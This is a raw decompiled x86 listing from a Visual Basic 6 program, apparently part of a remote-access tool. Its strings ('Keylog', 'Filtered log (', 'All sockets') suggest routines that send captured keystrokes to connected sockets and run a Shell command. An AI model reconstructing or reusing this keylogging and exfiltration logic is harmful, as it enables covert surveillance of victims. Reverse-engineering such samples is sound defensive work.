00748C7A: mov var_0000018C, eax
00748C80: mov var_00000194, 00000008h
00748C8A: mov var_000002BC, 0044A82Ch
00748C94: mov var_000002C4, 00000008h
00748C9E: fld real8 ptr var_0000031C
00748CA4: call 00410814h ; msvbvm60.dll.__vbaFpI4
00748CA9: push eax
00748CAA: push [008F2074h]
00748CB0: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00748CB5: mov eax, [eax]
00748CB7: mov var_000002CC, eax
00748CBD: mov var_000002D4, 00000008h
00748CC7: mov var_000002DC, 0044A834h ; .txt
00748CD1: mov var_000002E4, 00000008h
00748CDB: push 00000001h
00748CDD: lea eax, var_00000234
00748CE3: push eax
00748CE4: lea eax, var_74
00748CE7: push eax
00748CE8: lea eax, var_00000084
00748CEE: push eax
00748CEF: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748CF4: push eax
00748CF5: lea eax, var_00000094
00748CFB: push eax
00748CFC: lea eax, var_000000A4
00748D02: push eax
00748D03: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D08: push eax
00748D09: lea eax, var_00000244
00748D0F: push eax
00748D10: lea eax, var_000000B4
00748D16: push eax
00748D17: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D1C: push eax
00748D1D: lea eax, var_00000114
00748D23: push eax
00748D24: lea eax, var_00000124
00748D2A: push eax
00748D2B: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D30: push eax
00748D31: lea eax, var_00000284
00748D37: push eax
00748D38: lea eax, var_00000134
00748D3E: push eax
00748D3F: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D44: push eax
00748D45: lea eax, var_00000194
00748D4B: push eax
00748D4C: lea eax, var_000001A4
00748D52: push eax
00748D53: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D58: push eax
00748D59: lea eax, var_000002C4
00748D5F: push eax
00748D60: lea eax, var_000001B4
00748D66: push eax
00748D67: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D6C: push eax
00748D6D: lea eax, var_000002D4
00748D73: push eax
00748D74: lea eax, var_000001D4
00748D7A: push eax
00748D7B: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D80: push eax
00748D81: lea eax, var_000002E4
00748D87: push eax
00748D88: lea eax, var_000001E4
00748D8E: push eax
00748D8F: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748D94: push eax
00748D95: lea eax, var_000001F4
00748D9B: push eax
00748D9C: lea eax, var_00000204
00748DA2: push eax
00748DA3: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748DA8: push eax
00748DA9: call 00410A96h ; Shell
00748DAE: fstp real8 ptr var_00000314
00748DB4: lea ecx, var_30
00748DB7: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00748DBC: lea eax, var_64
00748DBF: push eax
00748DC0: lea eax, var_60
00748DC3: push eax
00748DC4: lea eax, var_5C
00748DC7: push eax
00748DC8: lea eax, var_58
00748DCB: push eax
00748DCC: lea eax, var_54
00748DCF: push eax
00748DD0: lea eax, var_50
00748DD3: push eax
00748DD4: lea eax, var_4C
00748DD7: push eax
00748DD8: lea eax, var_48
00748DDB: push eax
00748DDC: lea eax, var_44
00748DDF: push eax
00748DE0: lea eax, var_40
00748DE3: push eax
00748DE4: lea eax, var_3C
00748DE7: push eax
00748DE8: lea eax, var_38
00748DEB: push eax
00748DEC: lea eax, var_34
00748DEF: push eax
00748DF0: push 0000000Dh
00748DF2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00748DF7: add esp, 00000038h
00748DFA: lea eax, var_00000204
00748E00: push eax
00748E01: lea eax, var_000001F4
00748E07: push eax
00748E08: lea eax, var_000001E4
00748E0E: push eax
00748E0F: lea eax, var_000001D4
00748E15: push eax
00748E16: lea eax, var_000001B4
00748E1C: push eax
00748E1D: lea eax, var_000001C4
00748E23: push eax
00748E24: lea eax, var_000001A4
00748E2A: push eax
00748E2B: lea eax, var_00000194
00748E31: push eax
00748E32: lea eax, var_00000134
00748E38: push eax
00748E39: lea eax, var_00000184
00748E3F: push eax
00748E40: lea eax, var_00000174
00748E46: push eax
00748E47: lea eax, var_00000164
00748E4D: push eax
00748E4E: lea eax, var_00000154
00748E54: push eax
00748E55: lea eax, var_00000144
00748E5B: push eax
00748E5C: lea eax, var_00000124
00748E62: push eax
00748E63: lea eax, var_00000114
00748E69: push eax
00748E6A: lea eax, var_000000B4
00748E70: push eax
00748E71: lea eax, var_00000104
00748E77: push eax
00748E78: lea eax, var_000000F4
00748E7E: push eax
00748E7F: lea eax, var_000000E4
00748E85: push eax
00748E86: lea eax, var_000000D4
00748E8C: push eax
00748E8D: lea eax, var_000000C4
00748E93: push eax
00748E94: lea eax, var_000000A4
00748E9A: push eax
00748E9B: lea eax, var_00000094
00748EA1: push eax
00748EA2: lea eax, var_00000084
00748EA8: push eax
00748EA9: lea eax, var_74
00748EAC: push eax
00748EAD: push 0000001Ah
00748EAF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00748EB4: add esp, 0000006Ch
00748EB7: mov var_10, 00000000h
00748EBE: wait 
00748EBF: push 00748FEEh
00748EC4: jmp 00748FEDh
00748EC9: lea eax, var_30
00748ECC: push eax
00748ECD: lea eax, var_2C
00748ED0: push eax
00748ED1: lea eax, var_28
00748ED4: push eax
00748ED5: lea eax, var_24
00748ED8: push eax
00748ED9: push 00000004h
00748EDB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00748EE0: add esp, 00000014h
00748EE3: lea eax, var_64
00748EE6: push eax
00748EE7: lea eax, var_60
00748EEA: push eax
00748EEB: lea eax, var_5C
00748EEE: push eax
00748EEF: lea eax, var_58
00748EF2: push eax
00748EF3: lea eax, var_54
00748EF6: push eax
00748EF7: lea eax, var_50
00748EFA: push eax
00748EFB: lea eax, var_4C
00748EFE: push eax
00748EFF: lea eax, var_48
00748F02: push eax
00748F03: lea eax, var_44
00748F06: push eax
00748F07: lea eax, var_40
00748F0A: push eax
00748F0B: lea eax, var_3C
00748F0E: push eax
00748F0F: lea eax, var_38
00748F12: push eax
00748F13: lea eax, var_34
00748F16: push eax
00748F17: push 0000000Dh
00748F19: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00748F1E: add esp, 00000038h
00748F21: lea eax, var_00000224
00748F27: push eax
00748F28: lea eax, var_00000214
00748F2E: push eax
00748F2F: lea eax, var_00000204
00748F35: push eax
00748F36: lea eax, var_000001F4
00748F3C: push eax
00748F3D: lea eax, var_000001E4
00748F43: push eax
00748F44: lea eax, var_000001D4
00748F4A: push eax
00748F4B: lea eax, var_000001C4
00748F51: push eax
00748F52: lea eax, var_000001B4
00748F58: push eax
00748F59: lea eax, var_000001A4
00748F5F: push eax
00748F60: lea eax, var_00000194
00748F66: push eax
00748F67: lea eax, var_00000184
00748F6D: push eax
00748F6E: lea eax, var_00000174
00748F74: push eax
00748F75: lea eax, var_00000164
00748F7B: push eax
00748F7C: lea eax, var_00000154
00748F82: push eax
00748F83: lea eax, var_00000144
00748F89: push eax
00748F8A: lea eax, var_00000134
00748F90: push eax
00748F91: lea eax, var_00000124
00748F97: push eax
00748F98: lea eax, var_00000114
00748F9E: push eax
00748F9F: lea eax, var_00000104
00748FA5: push eax
00748FA6: lea eax, var_000000F4
00748FAC: push eax
00748FAD: lea eax, var_000000E4
00748FB3: push eax
00748FB4: lea eax, var_000000D4
00748FBA: push eax
00748FBB: lea eax, var_000000C4
00748FC1: push eax
00748FC2: lea eax, var_000000B4
00748FC8: push eax
00748FC9: lea eax, var_000000A4
00748FCF: push eax
00748FD0: lea eax, var_00000094
00748FD6: push eax
00748FD7: lea eax, var_00000084
00748FDD: push eax
00748FDE: lea eax, var_74
00748FE1: push eax
00748FE2: push 0000001Ch
00748FE4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00748FE9: add esp, 00000074h
00748FEC: ret 
End Sub

Private sub unknown_74F311
0074F311: push ebp
0074F312: mov ebp, esp
0074F314: sub esp, 00000018h
0074F317: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074F31C: mov eax, fs:[00h]
0074F322: push eax
0074F323: mov fs:[00000000h], esp
0074F32A: mov eax, 0000011Ch
0074F32F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074F334: push ebx
0074F335: push esi
0074F336: push edi
0074F337: mov var_18, esp
0074F33A: mov var_14, 00405E90h
0074F341: mov var_10, 00000000h
0074F348: mov var_0C, 00000000h
0074F34F: mov eax, [ebp+08h]
0074F352: mov eax, [eax]
0074F354: push [ebp+08h]
0074F357: call [eax+04h]
0074F35A: mov var_04, 00000001h
0074F361: mov edx, [ebp+0Ch]
0074F364: lea ecx, var_34
0074F367: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074F36C: mov var_04, 00000002h
0074F373: push FFFFFFFFh
0074F375: call 00410A60h ; On Error ...
0074F37A: mov var_04, 00000004h
0074F381: mov var_00000084, 00000001h
0074F38B: mov var_0000008C, 00000002h
0074F395: push 004412BCh
0074F39A: push 00000000h
0074F39C: push 00000007h
0074F39E: mov eax, [ebp+08h]
0074F3A1: mov eax, [eax]
0074F3A3: push [ebp+08h]
0074F3A6: call [eax+0000032Ch]
0074F3AC: push eax
0074F3AD: lea eax, var_50
0074F3B0: push eax
0074F3B1: call 00410A84h ; Set (object)
0074F3B6: push eax
0074F3B7: lea eax, var_68
0074F3BA: push eax
0074F3BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074F3C0: add esp, 00000010h
0074F3C3: push eax
0074F3C4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074F3C9: push eax
0074F3CA: lea eax, var_54
0074F3CD: push eax
0074F3CE: call 00410A84h ; Set (object)
0074F3D3: mov var_000000B8, eax
0074F3D9: lea eax, var_000000B4
0074F3DF: push eax
0074F3E0: mov eax, var_000000B8
0074F3E6: mov eax, [eax]
0074F3E8: push var_000000B8
0074F3EE: call [eax+1Ch]
0074F3F1: fclex 
0074F3F3: mov var_000000BC, eax
0074F3F9: cmp var_000000BC, 00000000h
0074F400: jnl 74F422h
0074F402: push 0000001Ch
0074F404: push 004412BCh
0074F409: push var_000000B8
0074F40F: push var_000000BC
0074F415: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074F41A: mov var_00000128, eax
0074F420: jmp 74F429h
0074F422: and var_00000128, 00000000h
0074F429: mov eax, var_000000B4
0074F42F: mov var_00000094, eax
0074F435: mov var_0000009C, 00000003h
0074F43F: mov var_000000A4, 00000001h
0074F449: mov var_000000AC, 00000002h
0074F453: lea eax, var_0000008C
0074F459: push eax
0074F45A: lea eax, var_0000009C
0074F460: push eax
0074F461: lea eax, var_000000AC
0074F467: push eax
0074F468: lea eax, var_000000E8
0074F46E: push eax
0074F46F: lea eax, var_000000D8
0074F475: push eax
0074F476: lea eax, var_30
0074F479: push eax
0074F47A: call 00410A3Ch ; For
0074F47F: mov var_00000120, eax
0074F485: lea eax, var_54
0074F488: push eax
0074F489: lea eax, var_50
0074F48C: push eax
0074F48D: push 00000002h
0074F48F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074F494: add esp, 0000000Ch
0074F497: lea ecx, var_68
0074F49A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074F49F: jmp 0074F6DEh
0074F4A4: mov var_04, 00000005h
0074F4AB: push 004412BCh
0074F4B0: push 00000000h
0074F4B2: push 00000007h
0074F4B4: mov eax, [ebp+08h]
0074F4B7: mov eax, [eax]
0074F4B9: push [ebp+08h]
0074F4BC: call [eax+0000032Ch]
0074F4C2: push eax
0074F4C3: lea eax, var_50
0074F4C6: push eax
0074F4C7: call 00410A84h ; Set (object)
0074F4CC: push eax
0074F4CD: lea eax, var_68
0074F4D0: push eax
0074F4D1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074F4D6: add esp, 00000010h
0074F4D9: push eax
0074F4DA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074F4DF: push eax
0074F4E0: lea eax, var_54
0074F4E3: push eax
0074F4E4: call 00410A84h ; Set (object)
0074F4E9: mov var_000000B8, eax
0074F4EF: lea eax, var_58
0074F4F2: push eax
0074F4F3: lea eax, var_30
0074F4F6: push eax
0074F4F7: mov eax, var_000000B8
0074F4FD: mov eax, [eax]
0074F4FF: push var_000000B8
0074F505: call [eax+24h]
0074F508: fclex 
0074F50A: mov var_000000BC, eax
0074F510: cmp var_000000BC, 00000000h
0074F517: jnl 74F539h
0074F519: push 00000024h
0074F51B: push 004412BCh
0074F520: push var_000000B8
0074F526: push var_000000BC
0074F52C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074F531: mov var_0000012C, eax
0074F537: jmp 74F540h
0074F539: and var_0000012C, 00000000h
0074F540: mov eax, var_58
0074F543: mov var_000000C0, eax
0074F549: lea eax, var_3C
0074F54C: push eax
0074F54D: push 00000005h
0074F54F: mov eax, var_000000C0
0074F555: mov eax, [eax]
0074F557: push var_000000C0
0074F55D: call [eax+00000084h]
0074F563: fclex 
0074F565: mov var_000000C4, eax
0074F56B: cmp var_000000C4, 00000000h
0074F572: jnl 74F597h
0074F574: push 00000084h
0074F579: push 004412DCh
0074F57E: push var_000000C0
0074F584: push var_000000C4
0074F58A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074F58F: mov var_00000130, eax
0074F595: jmp 74F59Eh
0074F597: and var_00000130, 00000000h
0074F59E: push var_3C
0074F5A1: push 0044BAE4h ; 100%
0074F5A6: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074F5AB: neg eax
0074F5AD: sbb eax, eax
0074F5AF: inc eax
0074F5B0: neg eax
0074F5B2: mov var_000000C8, ax
0074F5B9: lea ecx, var_3C
0074F5BC: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074F5C1: lea eax, var_58
0074F5C4: push eax
0074F5C5: lea eax, var_54
0074F5C8: push eax
0074F5C9: lea eax, var_50
0074F5CC: push eax
0074F5CD: push 00000003h
0074F5CF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074F5D4: add esp, 00000010h
0074F5D7: lea ecx, var_68
0074F5DA: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074F5DF: movsx eax, word ptr var_000000C8
0074F5E6: test eax, eax
0074F5E8: jz 0074F6BAh
0074F5EE: mov var_04, 00000006h
0074F5F5: push 004412BCh
0074F5FA: push 00000000h
0074F5FC: push 00000007h
0074F5FE: mov eax, [ebp+08h]
0074F601: mov eax, [eax]
0074F603: push [ebp+08h]
0074F606: call [eax+0000032Ch]
0074F60C: push eax
0074F60D: lea eax, var_50
0074F610: push eax
0074F611: call 00410A84h ; Set (object)
0074F616: push eax
0074F617: lea eax, var_68
0074F61A: push eax
0074F61B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074F620: add esp, 00000010h
0074F623: push eax
0074F624: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074F629: push eax
0074F62A: lea eax, var_54
0074F62D: push eax
0074F62E: call 00410A84h ; Set (object)
0074F633: mov var_000000B8, eax
0074F639: lea edx, var_30
0074F63C: lea ecx, var_78
0074F63F: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074F644: lea eax, var_78
0074F647: push eax
0074F648: mov eax, var_000000B8
0074F64E: mov eax, [eax]
0074F650: push var_000000B8
0074F656: call [eax+34h]
0074F659: fclex 
0074F65B: mov var_000000BC, eax
0074F661: cmp var_000000BC, 00000000h
0074F668: jnl 74F68Ah
0074F66A: push 00000034h
0074F66C: push 004412BCh
0074F671: push var_000000B8
0074F677: push var_000000BC
0074F67D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074F682: mov var_00000134, eax
0074F688: jmp 74F691h
0074F68A: and var_00000134, 00000000h
0074F691: lea eax, var_54
0074F694: push eax
0074F695: lea eax, var_50
0074F698: push eax
0074F699: push 00000002h
0074F69B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074F6A0: add esp, 0000000Ch
0074F6A3: lea eax, var_78
0074F6A6: push eax
0074F6A7: lea eax, var_68
0074F6AA: push eax
0074F6AB: push 00000002h
0074F6AD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074F6B2: add esp, 0000000Ch
0074F6B5: jmp 0074F37Ah
0074F6BA: mov var_04, 00000009h
0074F6C1: lea eax, var_000000E8
0074F6C7: push eax
0074F6C8: lea eax, var_000000D8
0074F6CE: push eax
0074F6CF: lea eax, var_30
0074F6D2: push eax
0074F6D3: call 00410A36h ; Next
0074F6D8: mov var_00000120, eax
0074F6DE: cmp var_00000120, 00000000h
0074F6E5: jnz 0074F4A4h
0074F6EB: mov var_04, 0000000Ah
0074F6F2: and [008F23B8h], 00000000h
0074F6F9: mov var_04, 0000000Bh
0074F700: fldz 
0074F702: fstp real8 ptr [008F23BCh]
0074F708: mov var_04, 0000000Ch
0074F70F: fldz 
0074F711: fstp real8 ptr [008F23ACh]
0074F717: mov var_04, 0000000Dh
0074F71E: push var_34
0074F721: push 00000000h
0074F723: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074F728: test eax, eax
0074F72A: jnz 74F73Dh
0074F72C: mov var_04, 0000000Eh
0074F733: and word ptr var_38, 0000h
0074F738: jmp 0074FB88h
0074F73D: mov var_04, 00000011h
0074F744: cmp [ebp+10h], 00000000h
0074F748: jnle 74F75Bh
0074F74A: mov var_04, 00000012h
0074F751: and word ptr var_38, 0000h
0074F756: jmp 0074FB88h
0074F75B: mov var_04, 00000015h
0074F762: mov eax, [ebp+14h]
0074F765: cmp [eax], 00000000h
0074F768: jz 0074F8C3h
0074F76E: mov var_04, 00000016h
0074F775: push 00FF00FFh
0074F77A: push 0044BC00h ; Filtered log (
0074F77F: push var_34
0074F782: call 00410A18h ; &
0074F787: mov edx, eax
0074F789: lea ecx, var_3C
0074F78C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F791: push eax
0074F792: push 004496A8h
0074F797: call 00410A18h ; &
0074F79C: mov edx, eax
0074F79E: lea ecx, var_40
0074F7A1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F7A6: push eax
0074F7A7: push [ebp+10h]
0074F7AA: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074F7AF: mov edx, eax
0074F7B1: lea ecx, var_44
0074F7B4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F7B9: push eax
0074F7BA: call 00410A18h ; &
0074F7BF: mov edx, eax
0074F7C1: lea ecx, var_48
0074F7C4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F7C9: push eax
0074F7CA: push 0044BB44h ; ) - Single
0074F7CF: call 00410A18h ; &
0074F7D4: mov edx, eax
0074F7D6: lea ecx, var_4C
0074F7D9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F7DE: push eax
0074F7DF: push 00442864h ; Keylog
0074F7E4: push 00443C28h
0074F7E9: call 0074FC42h
0074F7EE: lea eax, var_4C
0074F7F1: push eax
0074F7F2: lea eax, var_48
0074F7F5: push eax
0074F7F6: lea eax, var_44
0074F7F9: push eax
0074F7FA: lea eax, var_40
0074F7FD: push eax
0074F7FE: lea eax, var_3C
0074F801: push eax
0074F802: push 00000005h
0074F804: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074F809: add esp, 00000018h
0074F80C: mov var_04, 00000017h
0074F813: push 00000000h
0074F815: push 00000001h
0074F817: push 00000001h
0074F819: push 00000000h
0074F81B: lea eax, var_7C
0074F81E: push eax
0074F81F: push 00000010h
0074F821: push 00000880h
0074F826: call 00410946h ; ReDim
0074F82B: add esp, 0000001Ch
0074F82E: lea eax, var_34
0074F831: mov var_00000084, eax
0074F837: mov var_0000008C, 00004008h
0074F841: lea esi, var_0000008C
0074F847: push 00000000h
0074F849: push var_7C
0074F84C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074F851: mov ecx, eax
0074F853: mov edx, esi
0074F855: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074F85A: lea eax, [ebp+10h]
0074F85D: mov var_00000094, eax
0074F863: mov var_0000009C, 00004003h
0074F86D: lea esi, var_0000009C
0074F873: push 00000001h
0074F875: push var_7C
0074F878: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074F87D: mov ecx, eax
0074F87F: mov edx, esi
0074F881: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074F886: mov edx, 0043D54Ch ; x26
0074F88B: lea ecx, var_3C
0074F88E: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074F893: lea eax, var_7C
0074F896: push eax
0074F897: lea eax, var_3C
0074F89A: push eax
0074F89B: mov eax, [ebp+14h]
0074F89E: mov ecx, [eax]
0074F8A0: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0074F8A5: push eax
0074F8A6: call 007A6910h
0074F8AB: lea eax, var_7C
0074F8AE: push eax
0074F8AF: push 00000000h
0074F8B1: call 00410934h ; Erase
0074F8B6: lea ecx, var_3C
0074F8B9: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074F8BE: jmp 0074FB7Ch
0074F8C3: mov var_04, 00000019h
0074F8CA: push 00FF00FFh
0074F8CF: push 0044BC00h ; Filtered log (
0074F8D4: push var_34
0074F8D7: call 00410A18h ; &
0074F8DC: mov edx, eax
0074F8DE: lea ecx, var_3C
0074F8E1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F8E6: push eax
0074F8E7: push 004496A8h
0074F8EC: call 00410A18h ; &
0074F8F1: mov edx, eax
0074F8F3: lea ecx, var_40
0074F8F6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F8FB: push eax
0074F8FC: push [ebp+10h]
0074F8FF: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074F904: mov edx, eax
0074F906: lea ecx, var_44
0074F909: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F90E: push eax
0074F90F: call 00410A18h ; &
0074F914: mov edx, eax
0074F916: lea ecx, var_48
0074F919: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F91E: push eax
0074F91F: push 0044BB98h ; ) - All sockets
0074F924: call 00410A18h ; &
0074F929: mov edx, eax
0074F92B: lea ecx, var_4C
0074F92E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074F933: push eax
0074F934: push 00442864h ; Keylog
0074F939: push 00443C28h
0074F93E: call 0074FC42h
0074F943: lea eax, var_4C
0074F946: push eax
0074F947: lea eax, var_48
0074F94A: push eax
0074F94B: lea eax, var_44
0074F94E: push eax
0074F94F: lea eax, var_40
0074F952: push eax
0074F953: lea eax, var_3C
0074F956: push eax
0074F957: push 00000005h
0074F959: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074F95E: add esp, 00000018h
0074F961: mov var_04, 0000001Ah
0074F968: mov var_00000084, 00000001h
0074F972: mov var_0000008C, 00000002h
0074F97C: cmp [008F2010h], 00000000h
0074F983: jnz 74F9A0h
0074F985: push 008F2010h
0074F98A: push 00433984h
0074F98F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074F994: mov var_00000138, 008F2010h
0074F99E: jmp 74F9AAh
0074F9A0: mov var_00000138, 008F2010h
0074F9AA: mov eax, var_00000138
0074F9B0: mov eax, [eax]
0074F9B2: mov ecx, var_00000138
0074F9B8: mov ecx, [ecx]
0074F9BA: mov ecx, [ecx]
0074F9BC: push eax
0074F9BD: call [ecx+00000524h]
0074F9C3: push eax
0074F9C4: lea eax, var_50
0074F9C7: push eax
0074F9C8: call 00410A84h ; Set (object)
0074F9CD: mov var_000000B8, eax
0074F9D3: lea eax, var_000000B0
0074F9D9: push eax
0074F9DA: mov eax, var_000000B8
0074F9E0: mov eax, [eax]
0074F9E2: push var_000000B8
0074F9E8: call [eax+48h]
0074F9EB: fclex 
0074F9ED: mov var_000000BC, eax
0074F9F3: cmp var_000000BC, 00000000h
0074F9FA: jnl 74FA1Ch
0074F9FC: push 00000048h
0074F9FE: push 00440DE8h
0074FA03: push var_000000B8
0074FA09: push var_000000BC
0074FA0F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074FA14: mov var_0000013C, eax
0074FA1A: jmp 74FA23h
0074FA1C: and var_0000013C, 00000000h
0074FA23: mov ax, var_000000B0
0074FA2A: mov var_00000094, ax
0074FA31: mov var_0000009C, 00000002h
0074FA3B: mov var_000000A4, 00000001h
0074FA45: mov var_000000AC, 00000002h
0074FA4F: lea eax, var_0000008C
0074FA55: push eax
0074FA56: lea eax, var_0000009C
0074FA5C: push eax
0074FA5D: lea eax, var_000000AC
0074FA63: push eax
0074FA64: lea eax, var_00000108
0074FA6A: push eax
0074FA6B: lea eax, var_000000F8
0074FA71: push eax
0074FA72: lea eax, var_30
0074FA75: push eax
0074FA76: call 00410A3Ch ; For
0074FA7B: mov var_00000124, eax
0074FA81: lea ecx, var_50
0074FA84: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074FA89: jmp 0074FB6Fh
0074FA8E: mov var_04, 0000001Bh
0074FA95: push 00000000h
0074FA97: push 00000001h
0074FA99: push 00000001h
0074FA9B: push 00000000h
0074FA9D: lea eax, var_7C
0074FAA0: push eax
0074FAA1: push 00000010h
0074FAA3: push 00000880h
0074FAA8: call 00410946h ; ReDim
0074FAAD: add esp, 0000001Ch
0074FAB0: lea eax, var_34
0074FAB3: mov var_00000084, eax
0074FAB9: mov var_0000008C, 00004008h
0074FAC3: lea esi, var_0000008C
0074FAC9: push 00000000h
0074FACB: push var_7C
0074FACE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074FAD3: mov ecx, eax
0074FAD5: mov edx, esi
0074FAD7: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074FADC: lea eax, [ebp+10h]
0074FADF: mov var_00000094, eax
0074FAE5: mov var_0000009C, 00004003h
0074FAEF: lea esi, var_0000009C
0074FAF5: push 00000001h
0074FAF7: push var_7C
0074FAFA: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074FAFF: mov ecx, eax
0074FB01: mov edx, esi
0074FB03: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074FB08: mov edx, 0043D54Ch ; x26
0074FB0D: lea ecx, var_3C
0074FB10: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074FB15: lea eax, var_7C
0074FB18: push eax
0074FB19: lea eax, var_3C
0074FB1C: push eax
0074FB1D: lea eax, var_30
0074FB20: push eax
0074FB21: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0074FB26: push eax
0074FB27: call 007A6910h
0074FB2C: lea eax, var_7C
0074FB2F: push eax
0074FB30: push 00000000h
0074FB32: call 00410934h ; Erase
0074FB37: lea ecx, var_3C
0074FB3A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074FB3F: mov var_04, 0000001Ch
0074FB46: call 0041096Ah ; DoEvents
0074FB4B: mov var_04, 0000001Dh
0074FB52: lea eax, var_00000108
0074FB58: push eax
0074FB59: lea eax, var_000000F8
0074FB5F: push eax
0074FB60: lea eax, var_30
0074FB63: push eax
0074FB64: call 00410A36h ; Next
0074FB69: mov var_00000124, eax
0074FB6F: cmp var_00000124, 00000000h
0074FB76: jnz 0074FA8Eh
0074FB7C: mov var_04, 0000001Fh
0074FB83: or word ptr var_38, FFFFh
0074FB88: wait 
0074FB89: push 0074FC19h
0074FB8E: jmp 74FBE2h
0074FB90: lea eax, var_4C
0074FB93: push eax
0074FB94: lea eax, var_48
0074FB97: push eax
0074FB98: lea eax, var_44
0074FB9B: push eax
0074FB9C: lea eax, var_40
0074FB9F: push eax
0074FBA0: lea eax, var_3C
0074FBA3: push eax
0074FBA4: push 00000005h
0074FBA6: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074FBAB: add esp, 00000018h
0074FBAE: lea eax, var_58
0074FBB1: push eax
0074FBB2: lea eax, var_54
0074FBB5: push eax
0074FBB6: lea eax, var_50
0074FBB9: push eax
0074FBBA: push 00000003h
0074FBBC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074FBC1: add esp, 00000010h
0074FBC4: lea eax, var_78
0074FBC7: push eax
0074FBC8: lea eax, var_68
0074FBCB: push eax
0074FBCC: push 00000002h
0074FBCE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074FBD3: add esp, 0000000Ch
0074FBD6: lea eax, var_7C
0074FBD9: push eax
0074FBDA: push 00000000h
0074FBDC: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074FBE1: ret 
End Sub

Private sub unknown_68B0E4
0068B0E4: push ebp
0068B0E5: mov ebp, esp
0068B0E7: xor eax, eax
0068B0E9: pop ebp
0068B0EA: retn 0008h
End Sub

